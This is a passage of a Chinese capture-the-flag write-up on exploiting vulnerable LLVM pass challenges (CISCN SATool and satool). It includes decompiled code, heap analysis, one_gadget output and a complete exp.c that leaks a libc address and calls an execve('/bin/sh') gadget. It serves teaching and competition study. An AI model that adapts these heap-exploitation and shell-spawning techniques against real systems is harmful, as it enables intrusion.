class=\"keyword\">if</span> ( !(<span class=\"number\">-1431655765</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((<span class=\"type\">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class=\"number\">3</span>)) )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_154;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_153;</span><br><span class=\"line\">            v25 = *v24;</span><br><span class=\"line\">            v26 = *((_BYTE *)v8 + <span class=\"number\">16</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v26 == <span class=\"number\">79</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v27 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ( v26 != <span class=\"number\">29</span> )</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> LABEL_144;</span><br><span class=\"line\">              v27 = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            v28 = (__int64)&amp;v15[<span class=\"number\">3</span> * v27</span><br><span class=\"line\">                              + <span class=\"number\">-3</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - <span class=\"number\">3</span>))];</span><br><span class=\"line\">            v29 = &amp;v8[<span class=\"number\">-3</span> * (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>)];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( <span class=\"number\">-1431655765</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((<span class=\"type\">unsigned</span> __int64)(v28 - (_QWORD)v29) &gt;&gt; <span class=\"number\">3</span>) &lt;= <span class=\"number\">1</span> )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_154;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>u) &lt;= <span class=\"number\">1</span> )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_153;</span><br><span class=\"line\">            v30 = v29[<span class=\"number\">3</span>];</span><br><span class=\"line\">   <span class=\"comment\">// *************************************    / /         </span></span><br><span class=\"line\">            sub_2430(&amp;src, v25);</span><br><span class=\"line\">            sub_2430(v84, v30);</span><br><span class=\"line\">            bytes = n;</span><br><span class=\"line\">            chunk = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x18</span>uLL);            <span class=\"comment\">// 申请0x20的chunk</span></span><br><span class=\"line\">            chunk[<span class=\"number\">2</span>] = heap; </span><br></pre></td></tr></table></figure>\n<p>我们看这部分代码，一开始函数名就很长，但是我们看到了 compare，以及上文出现了 v10 = (_BYTE *) llvm::Value::getName (0LL);<br>\nv89 = dest; 这条，我们就大胆猜测，这里是判断函数名是否是 “save”。如果是，下面一大串就是对函数的一些常规检查，参数传递是否正确。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220611234626847.png\" alt=\"image-20220611234626847\"></p>\n<p>像这里就是检查参数是否是有两个，不然就无法执行。下面一直到分割线之前都是我们不需要搭理的，甚至下面的两个函数我们也不需要搭理。我们只要知道下面那些可以直接看懂的部分就好了。后面的分析大致一样。</p>\n<h3 id=\"save\"><a class=\"markdownIt-Anchor\" href=\"#save\">#</a> save</h3>\n<p>我们看 save 部分的关键代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">       sub_2430(&amp;src, v25);</span><br><span class=\"line\">       sub_2430(v84, v30);</span><br><span class=\"line\">       bytes = n;</span><br><span class=\"line\">bytes = n;</span><br><span class=\"line\">       chunk = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x18</span>uLL);            <span class=\"comment\">// 申请0x20的chunk</span></span><br><span class=\"line\">       chunk[<span class=\"number\">2</span>] = heap_ptr;                    <span class=\"comment\">// +0x18</span></span><br><span class=\"line\">       heap_ptr = chunk;                       <span class=\"comment\">// 明显这里储存了chunk的地址</span></span><br><span class=\"line\">       v33 = (<span class=\"type\">char</span> *)src;</span><br><span class=\"line\">       <span class=\"built_in\">memcpy</span>(chunk, src, bytes);          <span class=\"comment\">// 向chunk中拷贝数据</span></span><br><span class=\"line\">       v34 = chunk_ptr + <span class=\"number\">1</span>;</span><br><span class=\"line\">       v35 = (<span class=\"type\">char</span> *)v84[<span class=\"number\">0</span>];</span><br><span class=\"line\">       <span class=\"built_in\">memcpy</span>(v34, v84[<span class=\"number\">0</span>], (<span class=\"type\">size_t</span>)v84[<span class=\"number\">1</span>]);</span><br></pre></td></tr></table></figure>\n<p>首先申请到一个 0x20 大小的 chunk，并将这个地址记录到全局变量 heap。就是说这个 heap 变量每次经过 save 就会被更新，旧的并没有被保存。chunk+0x18 的内存记录 heap 变量的地址。下面是有个 src，以及两个 memcpy，但是我们还不清楚 src 以及 v84 是什么。简单进入 sub_2430 函数看一眼，知道这起码是两个字符串，而且是我们传进来的参数。<em>“isString() &amp;&amp; “Not a string””,</em>, “isa<X>(Val) &amp;&amp; “cast_or_null<Ty>() argument of incompatible type!””, 涉及到对字符串的看呗我们还需要进行调试。拷贝分 2 次，我们一会调试看看。</p>\n<p>经过调试，src 就是我们 save () 的第一个参数，v84 是第二个参数。 而且我们发现我们申请到的空间离 heap 页开始的地址非常远。第一个参数会写在用户区最开始的地方，第二个参数在 chunk_use+0x8，所以我们猜测应该会有检查参数长度。但是我们不需要管。而且调试的时候还发现，我们在 chunk+0x18 的地方会写入 heap_ptr 保存的值。其实就是上一个 save 创建的 chunk。这样就形成了单链表。</p>\n<p>我们继续看剩下的几个操作，</p>\n<h3 id=\"takeaway\"><a class=\"markdownIt-Anchor\" href=\"#takeaway\">#</a> takeaway</h3>\n<p>相似的检查方式，只不过参数变为了一个。这里话有个重要的变量 n。但是目前不清楚数值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             heap_ptr = (_QWORD *)heap_ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">           <span class=\"built_in\">free</span>(v45);</span><br></pre></td></tr></table></figure>\n<p>猜测其实就是删除某个 chunk，并且将全局变量 heap_ptr 回复为上一个 chunk。但是具体是否有查询功能还不确定。</p>\n<h3 id=\"stealkey\"><a class=\"markdownIt-Anchor\" href=\"#stealkey\">#</a> stealkey</h3>\n<p>这部分代码很少，也没有检查函数的参数，所以这个函数应该是没有参数的。关键点在于 byte_204100 = *heap; 某个全局变量值变为 chunk 的字符串的值对应的内存值。。</p>\n<h3 id=\"fakekey\"><a class=\"markdownIt-Anchor\" href=\"#fakekey\">#</a> fakekey</h3>\n<p>要求函数有一个参数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v76 = byte_204100;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ( *(_BYTE *)(*v75 + <span class=\"number\">16LL</span>) == <span class=\"number\">13</span> )</span><br><span class=\"line\">                SExtValue = llvm::APInt::getSExtValue((llvm::APInt *)(*v75 + <span class=\"number\">24LL</span>));</span><br><span class=\"line\">              <span class=\"keyword\">else</span></span><br><span class=\"line\">                SExtValue = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">              byte_204100 = v76 + SExtValue;</span><br><span class=\"line\">              *heap = v76 + SExtValue;</span><br></pre></td></tr></table></figure>\n<p>v76 可以通过刚刚的 steal 来设置，就会变为我们可控的值。关键在与 sextvalue 是什么，我们调试看看</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612014631136.png\" alt=\"image-20220612014631136\"></p>\n<p>调试后发现就是我们传进去的参数，如果我们要传负数，那就写补码。</p>\n<h3 id=\"run\"><a class=\"markdownIt-Anchor\" href=\"#run\">#</a> run</h3>\n<p>run 函数是最关键的也是最离谱的，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">((<span class=\"type\">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*heap)</span><br></pre></td></tr></table></figure>\n<p>直接无脑调用 heap_ptr 指向的 chunk 的 fd，那么思路就是想办法把地址写进去。这里就存在两个关键地方，一个是 fakekey 可以实现对 chunk 的 fd 的修改，在 v76 的基础上加上一个偏移量，那么如果我们能将 v76 的值改为 libc 或者 libc 的一个相关的值，加上一个 offset，就可以实现任意函数调用。因为 call  *heap 后面指定了参数为 0，我们就使用 onegadget。我们先看看这里的栈布局。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class=\"line\">*RAX  <span class=\"number\">0x7ffff33412fc</span> (exec_comm+<span class=\"number\">2508</span>) ◂— mov    rax, qword ptr [rip + <span class=\"number\">0x2e0ba5</span>]</span><br><span class=\"line\">*RBX  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RCX  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RDX  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RDI  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RSI  <span class=\"number\">0x0</span></span><br><span class=\"line\">*R8   <span class=\"number\">0x0</span></span><br><span class=\"line\">*R9   <span class=\"number\">0x0</span></span><br><span class=\"line\">*R10  <span class=\"number\">0x7c7738</span> —▸ <span class=\"number\">0x822940</span> —▸ <span class=\"number\">0x7fffffffdcf8</span> —▸ <span class=\"number\">0x7e4b50</span> —▸ <span class=\"number\">0x7e4b70</span> ◂— ...</span><br><span class=\"line\">*R11  <span class=\"number\">0x7ffff33f3b20</span> ◂— pop    rdi</span><br><span class=\"line\">*R12  <span class=\"number\">0x826e10</span> —▸ <span class=\"number\">0x7c7738</span> —▸ <span class=\"number\">0x822940</span> —▸ <span class=\"number\">0x7fffffffdcf8</span> —▸ <span class=\"number\">0x7e4b50</span> ◂— ...</span><br><span class=\"line\"> R13  <span class=\"number\">0x7fffffffda20</span> —▸ <span class=\"number\">0x7fffffffda30</span> ◂— <span class=\"number\">0x79656b006e7572</span> <span class=\"comment\">/* &#x27;run&#x27; */</span></span><br><span class=\"line\">*R14  <span class=\"number\">0x826e40</span> —▸ <span class=\"number\">0x826d88</span> —▸ <span class=\"number\">0x826c80</span> —▸ <span class=\"number\">0x826b80</span> —▸ <span class=\"number\">0x826990</span> ◂— ...</span><br><span class=\"line\">*R15  <span class=\"number\">0x826e28</span> —▸ <span class=\"number\">0x7e5218</span> —▸ <span class=\"number\">0x7fffffffdcf8</span> —▸ <span class=\"number\">0x7e4b50</span> —▸ <span class=\"number\">0x7e4b70</span> ◂— ...</span><br><span class=\"line\">*RBP  <span class=\"number\">0x8249c0</span> —▸ <span class=\"number\">0x6e7572</span> (isl_basic_set_compute_vertices+<span class=\"number\">2114</span>) ◂— js     <span class=\"number\">0x6e757c</span></span><br><span class=\"line\">*RSP  <span class=\"number\">0x7fffffffd950</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">*RIP  <span class=\"number\">0x7ffff23a21ec</span> ◂— call   rax</span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\"> ► <span class=\"number\">0x7ffff23a21ec</span>    call   rax                           &lt;exec_comm+<span class=\"number\">2508</span>&gt;</span><br><span class=\"line\">        rdi: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rsi: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rdx: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rcx: <span class=\"number\">0x0</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>先看看有没有合适的寄存器的 one_gadget, 没有的话在选择 stack 布局。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/llvm/SATool_2021_ciscn$ one_gadget /lib/x86_64-linux-gnu/libc-2.27.so -l3</span><br><span class=\"line\">0x4f2a5 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  rsp &amp; 0xf == 0</span><br><span class=\"line\">  rcx == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0x4f302 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+0x40] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe534f execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, r13, rbx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [r13] == NULL || r13 == NULL</span><br><span class=\"line\">  [rbx] == NULL || rbx == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe54f7 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, [rbp-0x88], [rbp-0x70])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class=\"line\">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe54fe execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, [rbp-0x70])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == NULL || rcx == NULL</span><br><span class=\"line\">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe5502 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, rdx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == NULL || rcx == NULL</span><br><span class=\"line\">  [rdx] == NULL || rdx == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0x10a2fc execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+0x70] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0x10a308 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsi] == NULL || rsi == NULL</span><br><span class=\"line\">  [[rax]] == NULL || [rax] == NULL</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>好多可以用的。</p>\n<p>问题来了我们怎么泄露 libc? 或者能否直接得到一个与 libc 相关的值？</p>\n<p>其实在第一次调试的时候吗，我们注意到第一次申请 0x20chunk 的时候，bins 不是空的，有 0x20 的 smallbin，largebin，u 你 sorted 斌，以及 tcache 中也有 7 个 bin。所以我们 save7 次将 tcache 取完，下一次就可以从 unsortedbin 中拿到，并且 fd 指向的是 main_arena+96, 与 libc 相关。我们只需要计算一下 offset 就可以了。</p>\n<p>我们申请第 8 个 chunk 的时候就选择空输入（’\\x00’），就不会变动 fd。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612021912812.png\" alt=\"image-20220612021912812\"></p>\n<p>这里可选择的 one_gadget 就很多了。选择了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x10a2fc</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>完整的 exp.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">run</span><span class=\"params\">()</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">save</span><span class=\"params\">(<span class=\"type\">char</span> *a1,<span class=\"type\">char</span> *a2)</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">fakekey</span><span class=\"params\">(int64)</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">takeaway</span><span class=\"params\">(<span class=\"type\">char</span> *a1)</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">B4ckDo0r</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        save(<span class=\"string\">&quot;aaaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;aaddd&quot;</span>,<span class=\"string\">&quot;aadd&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;ssss&quot;</span>,<span class=\"string\">&quot;sss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;ssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;sssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;sssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">\tsave(<span class=\"string\">&quot;sssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;\\x00&quot;</span>,<span class=\"string\">&quot;ssssss&quot;</span>);</span><br><span class=\"line\">        stealkey();</span><br><span class=\"line\">        fakekey(<span class=\"number\">-0x2E19b4</span>);</span><br><span class=\"line\">        run();</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>补充点，runOnFunction 会检查我们 exp 的入口是不是 B4ckDo0r，因为我们习惯 C 语言的代码为 main 为程序的入口。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dest[<span class=\"number\">2</span>] = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  name = (_QWORD *)llvm::Value::getName(a2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">8</span> &amp;&amp; *name == <span class=\"string\">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2022-satool\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2022-satool\">#</a> ciscn 2022 satool</h2>\n<p>这里我依旧是跟着师傅们的文章一边复现一边记录学习。</p>\n<p>首先还是看 readme，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## Introduction</span><br><span class=\"line\">A LLVM Pass that can optimize add/sub instructions.</span><br><span class=\"line\">## How to run</span><br><span class=\"line\">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class=\"line\">## Example</span><br><span class=\"line\">### IR before optimization</span><br><span class=\"line\">```</span><br><span class=\"line\">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class=\"line\">  %2 = sub nsw i64 %0, 2</span><br><span class=\"line\">  %3 = add nsw i64 %2, 68</span><br><span class=\"line\">  %4 = add nsw i64 %0, 6</span><br><span class=\"line\">  %5 = add nsw i64 %4, -204</span><br><span class=\"line\">  %6 = add nsw i64 %5, %3</span><br><span class=\"line\">  ret i64 %6</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```</span><br><span class=\"line\">### IR after optimization</span><br><span class=\"line\">```</span><br><span class=\"line\">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class=\"line\">  %2 = mul i64 %0, 2</span><br><span class=\"line\">  %3 = add i64 %2, -132</span><br><span class=\"line\">  ret i64 %3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```</span><br></pre></td></tr></table></figure>\n<p>opt-12 对应的就是 llvm-12，而且题目没有给出 opt。有师傅讲 ubuntu18 是不支持 opt-12 的。</p>\n<p>我们看看程序是如何优化代码的，在 handle 部分，有几个点，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v30 = *((_QWORD *)this + <span class=\"number\">4</span>) + <span class=\"number\">0xFF0</span>LL;        <span class=\"comment\">// shellcode结束的地方，0x***ff0</span></span><br></pre></td></tr></table></figure>\n<p>这里的 v30 就是指定了我们结束的空间，用来下面判断是会溢出超出这个区域。下面有三个分支，但是我们的目标是最后一个 else</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span>                                          <span class=\"comment\">// 真实的优化过程</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;anonymous namespace&#x27;</span>::MBAPass::writeMovImm64(this, <span class=\"number\">0</span>, <span class=\"number\">0LL</span>);<span class=\"comment\">// 在最开始的地方写movabs rax,0x0</span></span><br><span class=\"line\">    *((_DWORD *)this + <span class=\"number\">12</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;llvm::Value *&gt;::<span class=\"built_in\">stack</span>&lt;<span class=\"built_in\">std</span>::<span class=\"built_in\">deque</span>&lt;llvm::Value *&gt;,<span class=\"type\">void</span>&gt;(v26);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;<span class=\"type\">int</span>&gt;::<span class=\"built_in\">stack</span>&lt;<span class=\"built_in\">std</span>::<span class=\"built_in\">deque</span>&lt;<span class=\"type\">int</span>&gt;,<span class=\"type\">void</span>&gt;(<span class=\"built_in\">stack</span>);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;llvm::Value *&gt;::push(v26, &amp;v27);</span><br><span class=\"line\">    v24 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;<span class=\"type\">int</span>&gt;::push(<span class=\"built_in\">stack</span>, &amp;v24);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( *((_QWORD *)this + <span class=\"number\">5</span>) &lt; v30 )</span><br></pre></td></tr></table></figure>\n<p>执行完 *（this+12） = 0 后的情况是在这样的</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612213526191.png\" alt=\"image-20220612213526191\"></p>\n<p>this+12 指向的是 0x4c8d70 四字节。0x4c8c68 是记录当前我们要写入指令的位置。</p>\n<p>writeMovImm64 (this, 0, 0LL)，第二个参数指定寄存器，0 为 rax，1 为 rbx，0LL 是 64 位立即数。同理 writeret 就是向木匾位置写入 ret (0xc3)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> RDI  <span class=\"number\">0x4c8c40</span> —▸ <span class=\"number\">0x7ffff21dbd30</span> —▸ <span class=\"number\">0x7ffff21cded0</span> ◂— push   rbp</span><br><span class=\"line\"> RSI  <span class=\"number\">0x48af78</span> —▸ <span class=\"number\">0x4ddf80</span> —▸ <span class=\"number\">0x7fffffffd560</span> —▸ <span class=\"number\">0x4b3820</span> —▸ <span 